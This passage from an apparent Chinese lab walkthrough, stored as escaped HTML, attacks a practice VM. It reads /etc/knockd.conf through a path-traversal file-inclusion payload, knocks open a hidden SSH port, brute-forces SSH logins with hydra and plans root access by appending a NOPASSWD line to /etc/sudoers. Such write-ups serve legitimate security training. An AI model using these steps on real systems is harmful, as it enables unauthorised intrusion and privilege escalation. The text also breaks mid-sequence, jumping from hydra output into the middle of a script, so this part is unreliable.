2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e我们重新扫描一下端口\u003c/p\u003e\n\u003cp\u003e一开始我们使用的是：\u003ccode\u003enmap -sT -min-rate 10000 -p- 192.168.75.180\u003c/code\u003e 即建立完TCP链接后才表示有该端口\u003c/p\u003e\n\u003cp\u003e我们重新使用：\u003ccode\u003enmap -sS -min-rate 10000 -p- 192.168.75.180\u003c/code\u003e 即在建立TCP前的三次握手协议中的第一步，我们发送一个SYN包看对方是否回复，\u003ccode\u003eSYN/ACK\u003c/code\u003e表示端口在监听 (开放)， 该端口就被标记为被过滤\u003ccode\u003efiltered\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sS -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-04 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00011\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (reset)\nPORT   STATE    SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp filtered ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e     http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:E1:8F (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重新扫描后可以看到\u003ccode\u003eSSH\u003c/code\u003e端口是被过滤\u003ccode\u003efiltered\u003c/code\u003e 状态的，所以可能就是存在\u003ccode\u003eSSH\u003c/code\u003e的，但是被防火墙过滤了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e一般隐藏\u003ccode\u003eSSH\u003c/code\u003e是通过\u003ccode\u003eKnockd\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/guangdelw/p/18402272\"\u003ehttps://www.cnblogs.com/guangdelw/p/18402272\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003eKnockd\u003c/code\u003e 的配置文件在\u003ccode\u003e/etc/knockd.conf\u003c/code\u003e ，我们包含确定是否是\u003ccode\u003eKnockd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/manage.php?file=../../../../etc/knockd.conf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功包含！也就是说通过\u003ccode\u003eKnockd\u003c/code\u003e来隐藏了\u003ccode\u003eSSH\u003c/code\u003e服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eFile does \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e exist\n[options] \n\tUseSyslog \n[openSSH] \n\tsequence = \u003cspan class=\"hljs-number\"\u003e7469\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e8475\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9842\u003c/span\u003e \n\tseq_timeout = \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \n\tcommand = /sbin/iptables -I INPUT -s %IP% -p tcp --dport \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e -j ACCEPT \n\ttcpflags = syn \n[closeSSH] \n\tsequence = \u003cspan class=\"hljs-number\"\u003e9842\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e8475\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7469\u003c/span\u003e \n\tseq_timeout = \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \n\tcommand = /sbin/iptables -D INPUT -s %IP% -p tcp --dport \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e -j ACCEPT \n\ttcpflags = syn \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e分析一下配置文件：依次使用\u003ccode\u003eTCP\u003c/code\u003e访问\u003ccode\u003e7469,8475,9842\u003c/code\u003e 后（不超过25秒），则执行\u003ccode\u003e[openSSH]\u003c/code\u003e 区块的\u003ccode\u003ecommand\u003c/code\u003e ，用于允许来源IP（\u003ccode\u003e%IP%\u003c/code\u003e）的TCP连接通过22端口（SSH端口）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e分析完后，接下来就是进行敲门\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003eKocked\u003c/code\u003e 命令敲门\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eknock \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e7469\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8475\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e9842\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后再使用\u003ccode\u003enmap\u003c/code\u003e扫描看看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-04 \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:09 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:E1:8F (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这下\u003ccode\u003eSSH\u003c/code\u003e端口就打开了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e爆破SSH\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e将\u003ccode\u003eUserDetails\u003c/code\u003e表的\u003ccode\u003eusername\u003c/code\u003e和\u003ccode\u003epassword\u003c/code\u003e字段分别保存\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehydra -L username -P password -vV -e ns \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u003e ssh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破出个三用户的账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e][ssh] host: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.180\u003c/span\u0 \u003e (\u003cspan class=\"hljs-string\"\u003e\"Usage: python test.py read append\"\u003c/span\u003e)\n    sys.exit (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e :\n    f = \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(sys.argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u003cspan class=\"hljs-string\"\u003e\"r\"\u003c/span\u003e)\n    output = (f.read())\n\n    f = \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(sys.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e], \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e)\n    f.write(output)\n    f.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-markdown\"\u003e\n\u003cspan class=\"hljs-bullet\"\u003e-\u003c/span\u003e 如果参数数量不等于3（脚本名称和两个文件名），程序会打印用法提示并退出\n\u003cspan class=\"hljs-bullet\"\u003e-\u003c/span\u003e 使用\u003cspan class=\"hljs-code\"\u003e`open()`\u003c/span\u003e函数以只读模式打开第一个文件（\u003cspan class=\"hljs-code\"\u003e`sys.argv[1]`\u003c/span\u003e），并将其内容读入变量\u003cspan class=\"hljs-code\"\u003e`output`\u003c/span\u003e。\n\u003cspan class=\"hljs-bullet\"\u003e-\u003c/span\u003e 打开第二个文件（\u003cspan class=\"hljs-code\"\u003e`sys.argv[2]`\u003c/span\u003e）以附加模式（\"a\"）打开，并将从第一个文件读取的内容写入。\n\n思路：我们可以附加内容到 \u003cspan class=\"hljs-code\"\u003e`/etc/sudoers`\u003c/span\u003e ,将当前用户\u003cspan class=\"hljs-code\"\u003e`fredf`\u003c/span\u003e 附加\u003cspan class=\"hljs-code\"\u003e`fredf ALL=(ALL) NOPASSWD: ALL`\u003c/span\u003e \u003cspan class=\"hljs-strong\"\u003e****\u003c/span\u003e权限\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e创建文件 \u003ccode\u003etest\u003c/code\u003e内容是 \u003ccode\u003efredf ALL=(ALL) NOPASSWD: ALL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# nano test\u003c/span\u003e\n fredf ALL=(ALL) NO
